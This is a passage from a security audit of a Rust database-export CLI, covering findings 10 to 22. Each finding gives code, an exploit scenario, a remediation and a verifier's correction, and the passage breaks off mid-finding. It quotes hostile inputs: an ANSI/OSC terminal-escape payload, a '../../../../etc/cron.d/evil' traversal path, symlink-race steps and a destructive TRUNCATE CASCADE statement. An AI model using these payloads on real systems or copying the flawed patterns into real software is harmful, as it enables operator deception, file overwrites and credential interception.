**Эксплойт.** The parent re-emits two child-channel streams to its own terminal with no control-character stripping. Path A (IPC error_message): a compromised/adversarial source DB makes an export fail with an error string containing ANSI/OSC bytes, e.g. a column or query error that echoes the raw value `\x1b]0;PWNED\x07\x1b[2J\x1b[31mexport succeeded\x1b[0m`. In the child, job.rs:364-366 sets `summary.error_message = Some(redact_error(e))`; redact_error only strips URL passwords (redact.rs:149), NOT ESC/CSI/OSC bytes. summary.rs:336 puts it into `ChildEvent::Finished { error_message }`. serde_json escapes the ESC byte as `` on the wire and parallel_children.rs:156 `serde_json::from_str` decodes it back to a real 0x1B byte. It flows into parent_ui render_final_line -> final_line -> compact_line -> clamp_line (which only truncates by char count, mod.rs:169, no control filtering) and is written raw via write_all (line 392). Path B (captured stderr): the child's `log::error!("export '{}' failed: {}", ..., redacted)` (job.rs:366) is formatted by redacted_log_line (passwords only) and the parent captures the line verbatim (parallel_children.rs:197 `guard.0.push(line)`) and writes the whole block raw to its terminal (run.rs:222-223 `h.write_all(stderr_dump.as_bytes())`). Either way an on-DB attacker injects escape sequences into the operator's terminal: spoof a success/summary line over a real failure, set the window title, reposition the cursor, or (on emulators that honor it) abuse OSC clipboard/hyperlink sequences.

**Воздействие.** Operator deception / output integrity: an attacker who controls source-DB error text can paint a fake 'export succeeded' or hide a failure in the parent's run summary, set terminal title/clipboard, or scramble the card stack — undermining trust in the very channel the parent uses to report child outcomes. On exploitable emulators escape sequences can be more dangerous than cosmetic.

**Ремедиация.** Sanitize all child-channel text before writing to the terminal: strip or escape C0/C1 control bytes (everything < 0x20 except none, plus 0x7f-0x9f) from (a) the IPC error_message after parsing in parent_ui's render path and (b) each captured child stderr line in parallel_children.rs before push. A shared `sanitize_for_terminal()` applied in clamp_line and in render_child_stderr is the chokepoint. Also bound per-line length on the captured-stderr reader to avoid an unbounded single line.

#### 11. MCP MySQL pool sets no ssl_opts — TLS never enforced for MySQL diagnostics
`src/mcp.rs:402` · CWE-319 Cleartext Transmission of Sensitive Information · attacker: **network-mitm** · **EXPLOITABLE** · ревьюер: mcp

```rust
let opts = Opts::from(
        OptsBuilder::from_opts(Opts::from_url(url)?).pool_opts(
            PoolOpts::default()
                .with_constraints(PoolConstraints::new(1, 1).expect("valid pool constraints")),
        ),
    );
    Ok(mysql::Pool::new(opts)?)
```

**Эксплойт.** mysql_pool builds Opts straight from the URL and never calls .ssl_opts(Some(build_mysql_ssl_opts(...))) — unlike the production connect_with_tls / connect_pool paths in src/source/mysql/mod.rs (lines 119, 152) which set ssl_opts when the mode is enforced. The crate is pulled with `default-features = false, features = ["minimal", "native-tls"]` (Cargo.toml:56), so the minimal feature does not auto-enforce TLS from a URL ssl-mode param. Operator sets mysql_url=mysql://user:pass@db/app intending encrypted introspection; mysql_processlist / mysql_table_stats / mysql_key_metrics all run over a plaintext connection. An on-path attacker reads the credential handshake and SHOW PROCESSLIST output (which itself leaks other sessions' query text) in cleartext.

**Воздействие.** Cleartext MySQL auth + diagnostic data (including other clients' in-flight query snippets from SHOW PROCESSLIST) exposed to a network MITM; no way for the operator to force TLS on the MCP MySQL path.

**Ремедиация.** Build the MySQL pool through crate::source::mysql::connect_pool(url, tls.as_ref()) with a TlsConfig derived from the URL's ssl-mode, so ssl_opts are set when TLS is requested, matching the source-engine path.

**Поправка верификатора.** The finding is correct. I confirmed the missing mitigation the reporter implied (URL ssl-mode): mysql crate v28 has NO ssl-related URL parameter at all, and its query-param parser hard-errors on any unknown key, so an operator literally cannot append `?ssl-mode=REQUIRED` to force TLS — the connection would fail to even parse. Default Opts have `ssl_opts: None` and `additional_capabilities: empty()`, so no TLS upgrade is requested in the handshake. The rivet-mcp binary (src/bin/rivet-mcp.rs) plumbs no TlsConfig into run_stdio at all, only `--pg_url`/`--mysql_url`, so there is no way for the operator to enforce TLS on this path — confirming the impact claim. What the reporter MISSED: the Postgres MCP path (pg_connect at src/mcp.rs:219 and pgbouncer_query at :562) is identically vulnerable, using `postgres::NoTls` unconditionally — the cleartext gap is not MySQL-specific. One nuance lowering it from high: depending on the server auth plugin (mysql_native_password) the password is sent scrambled not in clear, but the diagnostic result data (SHOW PROCESSLIST query text from other sessions, table stats) is always cleartext, and caching_sha2/cleartext-plugin full-auth does expose the password.


### ⬜ LOW

#### 12. MCP server returns tool/connection errors to the (prompt-injectable) client without redaction
`src/mcp.rs:213` · CWE-209 Generation of Error Message Containing Sensitive Information · attacker: **malicious-mcp-client** · ревьюер: secrets

```rust
fn text(result: anyhow::Result<String>) -> anyhow::Result<Value> {
    let body = result.unwrap_or_else(|e| format!("error: {e}"));
    Ok(json!({ "content": [{ "type": "text", "text": body }] }))
}
```

**Эксплойт.** Every MCP error path formats the raw error and returns it to the client: text() (mcp.rs:213), dispatch() tool-call wrapper `format!("error: {e}")` (mcp.rs:86), and the JSON-RPC `"message": e.to_string()` (mcp.rs:43). None pass through redact::redact_error. The pg/mysql/pgbouncer connect helpers (pg_connect mcp.rs:221, mysql_pool mcp.rs:400-408, pgbouncer_query mcp.rs:563) build clients from URLs carrying credentials. A prompt-injected LLM can drive `tools/call` to force connection failures and read the raw error text. With the bundled tokio-postgres 0.7.17 and mysql 28.0.0, the driver error Display impls do not echo the password (mysql UrlError prints scheme/param names only; tokio-postgres connect errors do not embed the URL), so this is a defense-in-depth gap rather than a confirmed live password leak today — but the redaction chokepoint that the rest of the codebase relies on is entirely absent on this attacker-reachable surface, so a future driver bump or a new URL-echoing error variant would leak straight to the client.

**Воздействие.** No confirmed secret leak with current drivers; loss of the redaction invariant on an attacker-influenced output surface, leaving the MCP server one dependency change away from echoing connection-string credentials to an untrusted client.

**Ремедиация.** Wrap all three MCP error-emission sites (text(), the dispatch tool-call branch, and the JSON-RPC error `message`) in redact::redact_error / redact_secrets so the MCP output path shares the same chokepoint as logs and summaries.

**Поправка верификатора.** The finding is honest: it concedes "no confirmed secret leak with current drivers" and that is correct. I verified the bundled error Display impls directly in the vendored crate sources. tokio-postgres 0.7.17 prints only kind-based strings and option NAMES (Config even has a password-redacting Debug, config.rs:763); a malformed-URL parse error yields InvalidValue/UnknownOption carrying the option name, never the value/password. mysql 28.0.0 UrlError::InvalidValue carries only query-parameter key/value pairs (emitted in the ?param= loop at opts/mod.rs:641-774); the userinfo password from mysql://user:pass@host is extracted via url.password() (opts/mod.rs:1154) and is never routed into any error variant, and url::ParseError prints fixed kind strings, not the input. So no connection-failure error path echoes the credential today. Additional attacker-model dampening: pg_url/mysql_url/PGBOUNCER_ADMIN_URL are operator-supplied; the server is read-only; even a hypothetical leak would expose the operator's OWN DB password to the LLM that the operator already connected to that DB — modest escalation. The real issue is exactly as stated: the redaction chokepoint (redact::redact_error / redacted_log_line, wired in main.rs) is entirely absent on this surface, so the invariant is one driver bump away from failing. Defense-in-depth gap, not a live exploit.

#### 13. Custom `endpoint:` may be plain `http://`, sending the SigV4 Authorization header / bearer token / SAS in cleartext (opendal preserves an explicit http scheme)
`src/destination/s3.rs:43` · CWE-319 Cleartext Transmission of Sensitive Information · attacker: **network-mitm** · **EXPLOITABLE** · ревьюер: cloud-ssrf

```rust
if let Some(endpoint) = &config.endpoint {
    builder = builder.endpoint(endpoint);
}
```

**Эксплойт.** A config sets `endpoint: http://s3.internal.example.com` (a plausible-looking internal/MinIO endpoint a config author or copy-paste could introduce). opendal's S3 `build_endpoint` (backend.rs:499-507) only prefixes `https://` when NO scheme is present — an explicit `http://` is kept verbatim: `if endpoint.starts_with("http") { endpoint.to_string() }`. rivet performs no scheme check (config/mod.rs destination validation covers credential pairing and credentials_file existence only, never the endpoint string). The SigV4 `Authorization` header, `x-amz-security-token`, GCS `Authorization: Bearer`, or Azure SAS `sig=` then travel over plaintext TCP. An on-path attacker (shared LAN, malicious gateway, corporate proxy) reads the session token / bearer token / SAS signature off the wire and replays it.

**Воздействие.** On-path interception of live cloud credentials/tokens whenever an http endpoint is configured; the captured STS token / bearer token / SAS signature is directly replayable against the real cloud account until expiry.

**Ремедиация.** In config validation reject any `endpoint` whose scheme is `http://` and whose host is not loopback/`allow_anonymous` (emulator). At minimum log a hard warning. Pair with finding #1's scheme allowlist so the check is centralized.

**Поправка верификатора.** The reporter filed this under network-mitm, but an on-path attacker cannot SET the endpoint — they can only intercept once a plaintext http:// endpoint is already configured. The actual trigger belongs to untrusted-config-author, where a deliberately-hostile author has no need for this trick (they control endpoint + credential env vars and could exfiltrate via their own https endpoint directly). The genuine residual risk is a careless/copy-paste http:// internal or MinIO endpoint combined with a separate on-path attacker — a compound precondition, hence low rather than medium. The technical mechanism (opendal preserves explicit http://, no rivet scheme guard, sibling gaps in GCS/Azure) is fully real and correctly described.

#### 14. Cert-validation danger knobs (`accept_invalid_certs` / `accept_invalid_hostnames`) are applied with NO config-time warning, contradicting the code's own comment
`src/source/tls.rs:55` · CWE-295 Improper Certificate Validation · attacker: **untrusted-config-author** · **EXPLOITABLE** · ревьюер: tls

```rust
// works for IP-addressed hosts behind a cert. Each one emits a warning at
    // config-time (see `Config::validate`).
    if cfg.accept_invalid_certs {
        builder.danger_accept_invalid_certs(true);
    }
    if cfg.accept_invalid_hostnames {
        builder.danger_accept_invalid_hostnames(true);
    }
```

**Эксплойт.** A config author hands an operator a shared template that quietly includes `tls: { mode: verify-full, accept_invalid_certs: true }`. The `mode: verify-full` line reads as secure on a quick scan, but `accept_invalid_certs: true` disables chain validation in `build_native_tls` (and the MySQL/MSSQL equivalents). The code comment promises `Config::validate` warns on each danger knob, but grepping the whole tree (`grep -rn accept_invalid_certs src`) shows `Config::validate` never references these fields — no warning is ever emitted at config-time or runtime. So an operator running `rivet doctor` on the hostile template gets a clean, silent pass while every source connection accepts a MITM cert. The danger is hidden by a stale comment that an auditor would trust.

**Воздействие.** A hostile or careless config silently disables source-DB certificate validation with zero operator-visible signal, enabling MITM credential/data theft while passing all preflight checks.

**Ремедиация.** Actually implement the promised warning in `Config::validate` (and ideally print it on every run, not once): loudly flag `accept_invalid_certs` / `accept_invalid_hostnames` whenever set. Update or remove the misleading comment so future auditors are not misled.

#### 15. Local destination join (write/move/read) has no path-traversal containment
`src/destination/local.rs:22` · CWE-22 Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) · attacker: **untrusted-config-author** · ревьюер: path-traversal

```rust
fn write(&self, local_path: &Path, remote_key: &str) -> Result<super::WriteOutcome> {
    let target = Path::new(&self.base_path).join(remote_key);
    if let Some(parent) = target.parent() {
        std::fs::create_dir_all(parent)?;
    }
```

**Эксплойт.** This is the shared sink for every key that reaches the local backend, and it never checks `remote_key`. Besides export.name (separate finding), `LocalDestination::r#move` (local.rs:139-158) joins both `from` and `to` with the same unguarded `Path::new(&self.base_path).join(..)`. On `--resume`, the M9 quarantine path feeds part keys straight from a destination-resident manifest into `dest.r#move(src_key, quarantine_key)` (src/pipeline/chunked/resume_m8.rs:345; `quarantine_key = format!("{}/{}/{}", QUARANTINE_PREFIX, run_id, src_key)` at resume_m8.rs:344). A `manifest.json` whose part `path` is `../../../../etc/cron.d/evil` (an attacker who can drop a manifest into the prefix, e.g. a shared/world-writable output dir or an S3-then-synced-local layout) makes `from = ../../../../etc/cron.d/evil` and `to = _quarantine/<run_id>/../../../../etc/cron.d/evil`, letting the move read/relocate files outside the prefix. `Note: std::fs::rename behavior` — the join resolves the `..` lexically against base_path, escaping it.

**Воздействие.** Path traversal in the destination move/read primitives: relocate or read arbitrary files outside the configured prefix when the manifest/listing key is attacker-influenced, and the systemic absence of containment means any future caller that forwards a less-trusted key inherits the escape. Lower than the export.name case because it requires the attacker to seed a hostile manifest at the prefix.

**Ремедиация.** Add a single shared `safe_join(base, key)` helper used by write/read/head/move/list that rejects absolute keys and any `..` component (and NUL), then canonicalizes and asserts containment under `base_path`. Reject rather than silently clamp so a hostile key fails loudly.

**Поправка верификатора.** The finding's central premise — that the M9 quarantine move feeds part keys "straight from a destination-resident manifest" into dest.move — is wrong. (1) The untracked-quarantine src_key (resume_m8.rs:310) is an ObjectMeta.key from a LIVE `list_prefix` filesystem walk (resume_m8.rs:199, local.rs:80-102 / strip_prefix), NOT a manifest part path; read_dir never yields `.`/`..` and stripped keys hold only real on-disk components, so they cannot lexically contain `../`. The untracked set is built exclusively from that listing (manifest_reconcile.rs:175-185), never from manifest paths. (2) The per-part-quarantine src_key (resume_m8.rs:297) IS a manifest part.path, but quarantine_move is only invoked on a Quarantine decision (SizeMismatch/ChecksumMismatch), which requires the object to be Present in the listing, i.e. `listed.get(join_key(\"\", path))`==Some. A `../../etc/...` part path keys as itself (verified via join_key empty-dir branch) and can never equal an FS-walk listing key, so it always classifies Missing → Rewrite and never reaches move. A traversal-bearing `from` is therefore unreachable. The other manifest-path-forwarding sink (repair_cmd.rs:228) uses parts freshly produced by the in-process export (writer-named `..._chunk0_...`), not attacker data; and deep-validate reads only the fixed manifest_key/success_key, never per-part paths.

#### 16. destination.path / destination.prefix accept absolute and traversal paths with no guard
`src/destination/local.rs:11` · CWE-73 External Control of File Name or Path · attacker: **untrusted-config-author** · **EXPLOITABLE** · ревьюер: path-traversal

```rust
pub fn new(config: &DestinationConfig) -> Result<Self> {
    let base_path = config
        .path
        .clone()
        .or_else(|| config.prefix.clone())
        .unwrap_or_else(|| ".".to_string());
    Ok(Self { base_path })
}
```

**Эксплойт.** A teammate/template config sets `destination: { type: local, path: /etc/rivet-out }` or `path: ../../../../var/www/html`. `LocalDestination::new` takes it verbatim as `base_path`; nothing in `Config::validate_export` (src/config/mod.rs:389-509) constrains `destination.path`/`prefix` (only S3/GCS/Azure auth combinations and `query_file` are checked). The operator who runs `rivet run -c shared.yaml` then writes the export output under an attacker-chosen absolute/relative root. Because `{partition}`/`{date}`/`{export}` tokens are substituted into this same string (src/destination/placeholder.rs:106-119, src/plan/build.rs:111), a config can also point output at a sensitive tree per-run.

**Воздействие.** Output redirection: an authored config silently lands files in a directory the running operator did not expect (system dirs, another user's tree, a web root). Combined with finding #1 it is the second half of an arbitrary-write primitive. Rated low because writing to a configured destination is the field's nominal purpose; the gap is the absence of any allow-list/containment when the config author is not trusted.

**Ремедиация.** When the local destination base is config-author-controlled (not operator-supplied), validate it: reject `..` components and optionally absolute paths, or require operators to opt into an explicit root via a CLI flag. At minimum surface a warning when `path`/`prefix` is absolute or contains `..` so the operator sees where output will land before the run.

**Поправка верификатора.** Two corrections to the finding's framing. (1) The {partition} data-flow angle (attacker-controlled source DATA reaching the path) is NOT exploitable: the {partition} value side is `label_value` produced from a chrono `NaiveDate` via `cur.format(\"%Y-%m-%d\")` (src/plan/partition.rs:106; src/pipeline/partition_expand.rs:148,157,182), or the fixed constant `__HIVE_DEFAULT_PARTITION__`. It is type-constrained to a date string — adversarial source rows cannot inject `../` or an absolute prefix through it. So this is purely a config-author issue, not a malicious-source-db-data issue. (2) Severity context: within the untrusted-config-author model the author ALSO controls destination.type, bucket, endpoint, region, account_name with zero allow-list (src/config/destination.rs:11-48), so they can already exfiltrate the entire export to an attacker-owned S3/Azure endpoint — a strictly stronger, unconstrained output-redirection primitive. The missing local-path containment is the weaker subset of a capability the config author is already trusted with, not a new privilege.

#### 17. Predictable, deterministic temp staging name enables a symlink-follow race in the output dir
`src/destination/local.rs:37` · CWE-367 Time-of-check Time-of-use (TOCTOU) Race Condition · attacker: **local-attacker** · **EXPLOITABLE** · ревьюер: path-traversal

```rust
let tmp = target.with_file_name(format!(".{file_name}.tmp"));
if let Err(e) = std::fs::copy(local_path, &tmp) {
    let _ = std::fs::remove_file(&tmp);
    return Err(e.into());
}
if let Err(e) = std::fs::rename(&tmp, &target) {
```

**Эксплойт.** The staging path is fully deterministic: `<dir>/.<export>_<ts>.<ext>.tmp`, with `ts` formatted `%Y%m%d_%H%M%S` (src/pipeline/single.rs:333) — second-granularity and predictable from the export name + wall clock. A local unprivileged user who can write into the (operator-owned but group/world-writable, or shared-CI) output directory pre-creates a symlink `.<export>_<ts>.<ext>.tmp -> /path/the-operator-can-write`. `std::fs::copy` follows the existing symlink and writes the export bytes through it to the link target; the subsequent atomic `rename` then also targets the link's directory. The code comment even notes the temp name is deliberately deterministic so a stale temp is overwritten — which is exactly what makes it pre-creatable.

**Воздействие.** A local attacker who shares the output directory can redirect a part's bytes (operator-controlled but attacker-chosen-destination) through a symlink to a file the operator can write, or truncate/clobber via the predictable temp. Bounded to directories the attacker can already write into and the operator can write through, hence low.

**Ремедиация.** Create the temp with `O_CREAT|O_EXCL|O_NOFOLLOW` (e.g. `OpenOptions::new().write(true).create_new(true)` plus a NOFOLLOW flag) and include a random nonce in the temp name instead of a deterministic one, so a pre-planted symlink/file causes EEXIST rather than a silent follow. Stage into a per-run temp subdir the operator owns at 0700.

**Поправка верификатора.** No upstream guard exists in the write path. The deterministic temp is NOT a tempfile::NamedTempFile (those appear only in #[cfg(test)] code at lines 215/216/298); the production path uses a plain format!(".{file_name}.tmp"). std::fs::copy/std::fs::rename perform no O_NOFOLLOW or exclusive-create. The only thing the reporter understates slightly is the timing: predicting the exact second of ts is needed, but it is trivially defeated by pre-planting symlinks across candidate seconds/part indices, so the race is reliably winnable rather than a narrow window. The one real precondition the finding correctly bounds the impact on: the operator must point the local destination at a directory the unprivileged attacker can already write into (group/world-writable shared dir or shared CI workspace) — not the default, which keeps this at low.

#### 18. Plan-artifact integrity seal is an unkeyed xxh3 hash stored in the file it protects — tamper-evidence only against accidental edits, not a malicious writer
`src/plan/artifact.rs:463` · CWE-345 Insufficient Verification of Data Authenticity · attacker: **local-attacker** · **EXPLOITABLE** · ревьюер: deser-input

```rust
Ok(bytes) => format!("xxh3:{:016x}", xxh3_64(&bytes)),
```

**Эксплойт.** `resolved_plan_integrity` computes `xxh3:{:016x}` of the canonical JSON of `resolved_plan` with NO secret/HMAC/signature, and the result is stored in the same plan JSON under `integrity` (the field the seal is meant to protect). `verify_integrity` (artifact.rs:200) recomputes the SAME unkeyed hash and compares. An attacker who can write the plan file in the window between `rivet plan` and `rivet apply` (shared CI artifact store, world-writable temp/output dir, co-tenant) edits `resolved_plan.base_query` or `resolved_plan.destination`, then recomputes `xxh3:<hex>` over the canonicalised resolved_plan and overwrites the `integrity` field. `rivet apply` then passes the integrity gate and runs the attacker's query (`base_query` is sent raw to the DB) under the planned export name, optionally to an attacker destination. The unit test `apply_rejects_tampered_base_query` only edits base_query while leaving the seal stale — it does NOT cover an adaptive editor who recomputes the seal.

**Воздействие.** Tamper-evidence is defeated by any attacker who can both read and write the plan file: arbitrary query execution / redirect of exported data to an attacker destination under a trusted export name, with apply reporting success. Real value of the seal is limited to catching non-malicious corruption / hand-edits.

**Ремедиация.** Either (a) make the seal a real MAC keyed by a secret not stored in the artifact (HMAC with a key from the state DB / a keyfile / env), so a writer cannot forge it; or (b) drop the security framing and document `integrity` honestly as an accidental-corruption checksum, not tamper protection — and pair `rivet plan`/`apply` with file-permission guidance (0600, non-shared dir) since the artifact embeds an executable query contract. The docstrings ('tamper-evidence seal', 'makes apply reject the artifact') currently overstate the guarantee.

**Поправка верификатора.** No upstream guard mitigates the structural claim — grep for hmac/sign/signature/ed25519/secret_key across src/ returns zero crypto-keying; the seal is plain xxh3_64 recomputed identically at verify time and stored in the same JSON it protects. The finding is structurally correct: an adaptive writer recomputes xxh3 over the canonicalized resolved_plan and overwrites `integrity` to pass the gate (the two existing unit tests only mutate a field and leave the seal stale, so they do not cover the adaptive editor). The real correction is to the *framing*, not the facts: this is tamper-EVIDENCE against accidental edits/corruption, never an authenticity primitive, and the code's own docs say 'Do not hand-edit plan files.' An HMAC cannot fix it in a single-binary CLI where the same local user who can write the plan file can also read any shipped/co-located key — the local-attacker who can write the artifact is already inside the trust boundary and controls the execution contract regardless. So 'exploitable' is true in the literal sense (the gate is defeatable by an adaptive writer) but the impact is bounded exactly as the reporter conceded — value is limited to catching non-malicious corruption. Severity stays low; not an over- or under-statement.

#### 19. MCP Postgres + pgBouncer connections hardcode NoTls — sslmode=require silently downgraded to plaintext
`src/mcp.rs:221` · CWE-319 Cleartext Transmission of Sensitive Information · attacker: **network-mitm** · ревьюер: mcp

```rust
fn pg_connect(url: &str) -> anyhow::Result<postgres::Client> {
    use postgres::NoTls;
    Ok(postgres::Client::connect(url, NoTls)?)
}
```

**Эксплойт.** Operator configures the MCP server with DATABASE_URL=postgresql://user:pass@db.internal/app?sslmode=require (or verify-full), expecting encrypted diagnostic traffic — the same URL that the recently-fixed init/state/checkpoint paths now honor via tls_mode_from_url + connect_client. But pg_connect (and the pgbouncer connect at src/mcp.rs:563, `postgres::Client::connect(&admin_url, NoTls)`) pass `NoTls` unconditionally. With rust-postgres, NoTls never negotiates TLS regardless of the URL's sslmode, so the connection succeeds in cleartext instead of failing. Steps: (1) operator sets sslmode=require in the MCP URL; (2) an on-path attacker between rivet-mcp and the DB (or pgBouncer admin port) observes the startup auth exchange and every pg_active_sessions / pg_locks / table-stats result set in plaintext, and can MITM/downgrade with no certificate to forge. The sslmode=require contract is silently void only on the MCP path.

**Воздействие.** Cleartext exposure of DB credentials (auth handshake) and all diagnostic result sets to an on-path attacker; sslmode=verify-full's cert-pinning intent is silently ignored, enabling undetected MITM. Sibling gap: the wave fixed init/state/checkpoint NoTls but missed the MCP server's own connect helpers.

**Ремедиация.** Route MCP Postgres connections through the same TLS-aware path as init: derive a TlsConfig via crate::init::postgres::tls_mode_from_url(url) (or the shared tls_mode_from_url) and call crate::source::postgres::connect_client(url, tls.as_ref()) instead of Client::connect(url, NoTls). Apply the same to the pgBouncer admin connection at line 563.

**Поправка верификатора.** The finding's central premise — "with rust-postgres, NoTls never negotiates TLS regardless of the URL's sslmode, so the connection succeeds in cleartext instead of failing" — is factually wrong for this driver version. I read the actual tokio-postgres 0.7.17 source. (1) Client::connect parses `sslmode` from the URL into Config.ssl_mode (config.rs:584). (2) For sslmode=require, connect_tls.rs does NOT early-return a plaintext stream: the `SslMode::Prefer | SslMode::Require => {}` arm falls through, sends the SSL request, and then calls `tls.connect(stream)`. NoTls's TlsConnect::connect returns NoTlsFuture which always yields Err(NoTlsError) (tls.rs), so the connect FAILS — no plaintext connection is ever established. If the server doesn't support TLS, mode==Require returns Err("server does not support TLS"). Either way it is fail-closed, not fail-open. (3) verify-ca/verify-full are rejected at URL-parse time (config.rs:589 `_ => return Err(InvalidValue("sslmode"))`), so they error before any socket — they are not "silently ignored as plaintext." (4) All five pg_connect call sites and pgbouncer_query use `?`, propagating the connect error as a tool error; there is no downgrade/retry that would re-open plaintext. The only plaintext cases are absent/disable/prefer sslmode, which is correct libpq semantics (prefer explicitly permits plaintext fallback). So a sslmode=require/verify-full MITM scenario yields zero traffic to observe — the credential handshake and result sets are never transmitted.

#### 20. MSSQL TLS uses fully-vulnerable rustls-webpki 0.101.7 (CA name-constraint bypass + CRL panic), suppressed in audit.toml
`.cargo/audit.toml:69` · CWE-295 Improper Certificate Validation · attacker: **network-mitm** · ревьюер: deps-build

```rust
"RUSTSEC-2026-0104", # rustls-webpki: reachable panic parsing a CRL
    "RUSTSEC-2026-0098", # rustls-webpki: URI-name constraints incorrectly accepted
    "RUSTSEC-2026-0099", # rustls-webpki: wildcard-name constraints accepted
```

**Эксплойт.** Confirmed via `cargo tree -i rustls-webpki@0.101.7`: `tiberius 0.12.3 -> tokio-rustls 0.24.1 -> rustls 0.21.12 -> rustls-webpki 0.101.7`. The rest of the tree resolves the patched rustls-webpki 0.103.13, but the MSSQL engine pins the old vulnerable one. In `src/source/mssql/mod.rs:155-158` an operator who sets `source.tls.ca_file` takes the `config.trust_cert_ca(ca)` path, which performs full chain validation through this vulnerable webpki. RUSTSEC-2026-0098/0099: a MITM presenting a cert whose name asserts a URI or wildcard name that should be rejected by the trusted CA's name constraints is incorrectly ACCEPTED, defeating the verify-full posture the operator opted into. RUSTSEC-2026-0104 is a remotely-triggerable panic (DoS) parsing a crafted CRL. All three are masked from CI by the audit.toml ignore list, so `cargo audit` reports 0 vulnerabilities while they are live (running audit against the lockfile with no ignore config prints `error: 4 vulnerabilities found!`).

**Воздействие.** Defeat of TLS certificate validation for SQL Server connections (the verify-full guarantee the operator explicitly configured), enabling credential interception / data tampering by an on-path attacker; plus a remote DoS panic. The fact that it is silently ignored means the gap never surfaces to maintainers.

**Ремедиация.** The webpki name-constraint advisories DO have fixes (>=0.103.12); the blocker is tiberius pinning rustls 0.21. Either (a) carry a `[patch.crates-io]` / fork bumping tiberius to a newer rustls, (b) gate the MSSQL engine behind a non-default feature so default installs do not ship the vulnerable webpki, or (c) at minimum split the ignore so the CRL-panic and name-constraint entries are time-boxed with a tracking issue and re-verified each release rather than left open-ended. Do not rely on `trust_cert()` default to argue non-reachability — the moment an operator sets ca_file the vulnerable path is live.

**Поправка верификатора.** The finding's underlying facts are all TRUE and confirmed: (1) the exact ignore entries exist at audit.toml:69-71; (2) `cargo tree -i` confirms `tiberius 0.12.3 -> tokio-rustls 0.24.1 -> rustls 0.21.12 -> rustls-webpki 0.101.7` while the rest of the tree uses patched 0.103.13; (3) running `cargo audit` on the lockfile WITHOUT the ignore config prints `error: 4 vulnerabilities found!`, with the ignore list CI reports clean, and the CI `audit` job (ci.yml:382-399) runs `cargo audit` which honors audit.toml — so the suppression is real and hides it from maintainers; (4) the `ca_file` path in src/source/mssql/mod.rs:156-157 does route through tiberius `trust_cert_ca` -> webpki full chain validation. What the finding OVERSTATES is the impact/exploitability for the stated network-mitm attacker. The CRL panic (0104) is unreachable — the advisory says verbatim 'Applications that do not use CRLs are not affected' and tiberius never configures CRLs (no with_crls, rustls 0.21 does no revocation checking). The two name-constraint bugs (0098/0099) are, per the advisories themselves, 'reachable only after signature verification and require misissuance to exploit' — the attacker's cert must already be VALIDLY SIGNED by the operator's pinned CA; signature verification (unaffected by these bugs) still blocks a generic on-path MITM. They additionally require a CA that asserts URI or wildcard-permitted DNS nameConstraints, which is not a property of typical SQL Server / RDS / Azure CAs. So this is not a 'defeat of TLS cert validation enabling credential interception by an on-path attacker' — it is a vulnerable transitive dependency suppressed in CI with a narrow, misissuance-only residual risk.

#### 21. `seed` binary shipped by `cargo install` runs unconditional destructive TRUNCATE CASCADE against a default local DB with no confirmation
`src/bin/seed/fast.rs:19` · CWE-1188 Insecure Default / Dangerous Default Behavior · attacker: **operator-mistake** · ревьюер: deps-build

```rust
client.batch_execute(
        "SET synchronous_commit = off;
         TRUNCATE orders_coalesce, orders_sparse, content_items, page_views, events, orders, users RESTART IDENTITY CASCADE",
    )?;
```

**Эксплойт.** The `[[bin]] seed` target in Cargo.toml (lines 25-27) has NO `required-features` gate and `src/bin/seed` is NOT in the crate `exclude` list, so `cargo install rivet-cli` (the documented install path) compiles and installs a generically-named `seed` binary onto the user's PATH alongside `rivet`. Its args default to `target = "both"` and `pg_url = postgresql://rivet:rivet@localhost:5432/rivet` / `mysql_url = mysql://rivet:rivet@localhost:3306/rivet` (src/bin/seed/args.rs:27-64). On invocation with zero arguments it immediately connects (NoTls) and runs `TRUNCATE ... orders, users RESTART IDENTITY CASCADE` (and the MySQL equivalent in insert.rs:385-391 / fast.rs:119-125) with no `--yes`/`--force`/confirmation prompt and no env guard. An operator who typed `seed` expecting an unrelated tool, or a CI/dev script with a colliding binary name, silently wipes any local DB that happens to use these (very common) table names. The CASCADE also drops dependent rows in tables not listed.

**Воздействие.** Irreversible data loss in a developer/staging database from a single mistyped or mis-targeted invocation of a binary the user never intended to install; classic dangerous-default footgun amplified by the generic `seed` name on PATH.

**Ремедиация.** Stop shipping `seed` to end users: either move it to `dev/` (already excluded) as an example/xtask, gate it behind `required-features = ["dev-seed"]` (off by default) so `cargo install` does not install it, or rename it to `rivet-seed` and require an explicit `--yes`/`--i-know-this-truncates` confirmation plus refuse to run unless the target DB name matches an expected fixture name. At minimum the TRUNCATE must be behind an interactive confirmation when stdin is a TTY.

**Поправка верификатора.** Every technical claim in the finding is accurate and verified: the TRUNCATE...CASCADE quote is verbatim at fast.rs:19-22 (and replicated at copy_pg.rs:24, insert.rs:146, plus per-table MySQL TRUNCATEs at fast.rs:119-125 / insert.rs:385-391); the `seed` bin target has no required-features gate; `cargo package --list` proves src/bin/seed/ ships in the published crate (the exclude list only covers dev/, tests/, etc., not src/bin/seed/); defaults are target=both + localhost:5432 with creds rivet:rivet; and there is genuinely no confirmation/--yes/env guard. An independent arch review (docs/planning/arch_roast_2026-06-10.md:415-433) already flagged the identical defect. What the finding overstates is the attacker model and blast radius: (1) the declared attacker is 'operator-mistake' — self-inflicted, not in any of the six adversarial threat models; no malicious-source-db, untrusted-config-author, MCP client, local user, MITM, or supply-chain party can influence whether/when the operator types `seed`. (2) It does NOT 'wipe any local DB with common table names' on a bare invocation — the destructive run only reaches a database that is both listening on localhost:5432 AND accepts the hardcoded dev creds rivet:rivet; a different real DB is only hit if the operator explicitly passes --pg-url/--mysql-url, at which point the destruction is intentional, not accidental. So the impact is a genuine dangerous-default/packaging-hygiene footgun (a generically-named destructive dev tool installed on PATH by the documented install path), but it is not adversary-exploitable.

#### 22. Destination manifest.json read into memory with no size cap (size_bytes from head() discarded)
`src/pipeline/chunked/resume_m8.rs:137` · CWE-400 Uncontrolled Resource Consumption · attacker: **malicious-source-db-data** · ревьюер: dos-resource

```rust
let manifest_bytes = match dest.head(MANIFEST_FILENAME) {
        Ok(Some(_)) => match dest.read(MANIFEST_FILENAME) {
            Ok(b) => b,
```

